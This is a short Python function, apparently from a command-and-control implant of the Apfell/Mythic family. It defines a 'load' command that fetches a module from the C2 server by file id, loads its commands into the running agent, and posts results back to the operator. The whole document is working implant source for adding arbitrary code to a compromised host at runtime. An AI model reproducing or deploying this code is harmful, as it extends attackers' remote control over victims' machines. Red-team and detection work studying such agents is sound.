def load(apfell, c2, params="", task_id=""):
    import json
    try:
        param_json = json.loads(params)
        module = c2.upload(param_json['file_id'])
        apfell.load_zip(module, param_json['cmds'])
        output = json.dumps({"user_output": "Loaded {}".format(param_json['cmds']), "completed": True})
        c2.post_response(response=output, task_id=task_id)
    except Exception as e:
        output = json.dumps({"user_output": "Failed to load module: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
    apfell.remove_job(task_id)

COMMAND_ENDS_HERE